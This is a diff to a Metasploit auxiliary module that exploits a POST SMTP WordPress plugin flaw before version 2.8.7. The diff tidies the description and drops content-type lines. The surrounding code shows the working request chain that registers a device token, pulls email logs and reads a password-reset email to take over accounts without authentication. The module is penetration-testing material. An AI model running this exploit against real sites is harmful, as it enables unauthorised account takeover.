@@ -13,11 +13,10 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name' => 'Wordpress POST SMTP Account Takeover',
         'Description' => %q{
-          The POST SMTP WordPress plugin
-          prior to 2.8.7 is affected by a privilege escalation where an unauthenticated
-          user is able to reset the password of an arbitrary user. This is done by
-          requesting a password reset, then viewing the latest email logs to find
-          the associated password reset email.
+          The POST SMTP WordPress plugin prior to 2.8.7 is affected by a privilege
+          escalation where an unauthenticated user is able to reset the password
+          of an arbitrary user. This is done by requesting a password reset, then
+          viewing the latest email logs to find the associated password reset email.
         },
         'Author' => [
           'h00die', # msf module
@@ -51,7 +50,6 @@ class MetasploitModule < Msf::Auxiliary
     res = send_request_cgi(
       'method' => 'POST',
       'uri' => normalize_uri(target_uri.path, 'wp-json', 'post-smtp', 'v1', 'connect-app'),
-      'ctype' => 'application/x-www-form-urlencoded',
       'headers' => { 'fcm-token' => token, 'device' => device }
     )
     fail_with(Failure::Unreachable, 'Connection failed') unless res
@@ -82,7 +80,6 @@ class MetasploitModule < Msf::Auxiliary
     print_status('Requesting logs')
     res = send_request_cgi(
       'uri' => normalize_uri(target_uri.path, 'wp-json', 'post-smtp', 'v1', 'get-logs'),
-      'ctype' => 'application/x-www-form-urlencoded',
       'headers' => { 'fcm-token' => token, 'device' => device }
     )
     fail_with(Failure::Unreachable, 'Connection failed') unless res
@@ -93,7 +90,6 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Requesting email content from logs for ID #{doc_id}")
     res = send_request_cgi(
       'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin.php'),
-      'ctype' => 'application/x-www-form-urlencoded',
       'headers' => { 'fcm-token' => token, 'device' => device },
       'vars_get' => { 'access_token' => token, 'type' => 'log', 'log_id' => doc_id }
     )
